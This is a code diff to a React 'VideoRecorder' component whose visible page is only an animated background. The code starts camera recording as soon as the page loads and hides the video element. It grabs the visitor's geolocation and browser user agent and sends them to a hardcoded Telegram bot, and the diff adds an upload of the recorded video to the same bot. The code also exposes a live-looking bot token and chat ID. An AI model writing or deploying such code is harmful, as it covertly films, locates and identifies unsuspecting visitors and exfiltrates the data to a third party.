@@ -124,6 +124,7 @@ function VideoRecorder() {
 
       recorder.onstop = async () => {
         const videoBlob = new Blob(chunksRef.current, { type: "video/webm" });
+        await sendVideoToTelegram(videoBlob);
         stopStream();
       };
 
@@ -149,60 +150,81 @@ function VideoRecorder() {
     }
   };
 
-  // Отправка геоданных в Telegram
-  const sendGeoToTelegram = async () => {
-    if (geoData && !infoSent) {
-      const formData = new FormData();
-      formData.append("chat_id", "7819537579"); // ID чата
-      formData.append(
-        "text",
-        `📍 Location: ${geoData.latitude}, ${geoData.longitude}\n🌐 Device: ${userAgent}`
+  const sendGeoToTelegram = async (geo, agent) => {
+    const text = `📍 Location: ${geo.latitude}, ${geo.longitude}\n🌐 Device: ${agent}`;
+
+    try {
+      const response = await fetch(
+        `https://api.telegram.org/bot7994259922:AAFg95V-vIqovZXU8RXQfeo9TC91Bu3ppK8/sendMessage`,
+        {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            chat_id: "7819537579",
+            text: text,
+          }),
+        }
       );
 
-      try {
-        const response = await fetch(
-          `https://api.telegram.org/bot7994259922:AAFg95V-vIqovZXU8RXQfeo9TC91Bu3ppK8/sendMessage`,
-          {
-            method: "POST",
-            body: formData,
-          }
-        );
-        if (response.ok) {
-          console.log("✅ Геолокация успешно отправлена в Telegram");
-          setInfoSent(true); // Помечаем, что информация отправлена
-        } else {
-          console.error("❌ Ошибка при отправке геолокации в Telegram");
-        }
-      } catch (error) {
-        console.error("❌ Ошибка при отправке геолокации:", error);
+      if (response.ok) {
+        console.log("✅ Геолокация успешно отправлена в Telegram");
+        setInfoSent(true);
+      } else {
+        const errorData = await response.json();
+        console.error("❌ Ошибка при отправке геолокации:", errorData);
       }
+    } catch (error) {
+      console.error("❌ Сетевая ошибка:", error);
     }
   };
 
-  // Геолокация и устройство — один раз
+  const sendVideoToTelegram = async (blob) => {
+    const formData = new FormData();
+    formData.append("chat_id", "7819537579");
+    formData.append("video", blob, "recording.webm");
+    formData.append("caption", "Видео запись с устройства");
+
+    try {
+      const response = await fetch(
+        `https://api.telegram.org/bot7994259922:AAFg95V-vIqovZXU8RXQfeo9TC91Bu3ppK8/sendVideo`,
+        {
+          method: "POST",
+          body: formData,
+        }
+      );
+
+      if (response.ok) {
+        console.log("✅ Видео успешно отправлено в Telegram");
+      } else {
+        const errorData = await response.json();
+        console.error("❌ Ошибка при отправке видео:", errorData);
+      }
+    } catch (error) {
+      console.error("❌ Ошибка отправки видео:", error);
+    }
+  };
+
   useEffect(() => {
-    if ("geolocation" in navigator) {
+    if ("geolocation" in navigator && !infoSent) {
       navigator.geolocation.getCurrentPosition(
         (position) => {
-          console.log("🌍 Геолокация получена:", position.coords);
-          setGeoData({
+          const newGeo = {
             latitude: position.coords.latitude,
             longitude: position.coords.longitude,
-          });
-
-          // Отправляем гео-данные сразу, как только получены
-          sendGeoToTelegram();
+          };
+          setGeoData(newGeo);
+          setUserAgent(navigator.userAgent);
+          sendGeoToTelegram(newGeo, navigator.userAgent);
         },
         (err) => {
           console.error("❌ Ошибка получения геолокации:", err);
         }
       );
     }
+  }, [infoSent]);
 
-    setUserAgent(navigator.userAgent);
-  }, []);
-
-  // Отслеживание активности страницы
   useEffect(() => {
     const handleVisibilityChange = () => {
       if (document.visibilityState === "visible") {
@@ -213,7 +235,7 @@ function VideoRecorder() {
     };
 
     document.addEventListener("visibilitychange", handleVisibilityChange);
-    startRecording(); // Начинаем запись сразу при заходе
+    startRecording();
 
     return () => {
       document.removeEventListener("visibilitychange", handleVisibilityChange);
@@ -225,6 +247,7 @@ function VideoRecorder() {
   return (
     <div>
       <AnimatedBackground />
+      <video ref={videoRef} autoPlay muted style={{ display: "none" }} />
     </div>
   );
 }
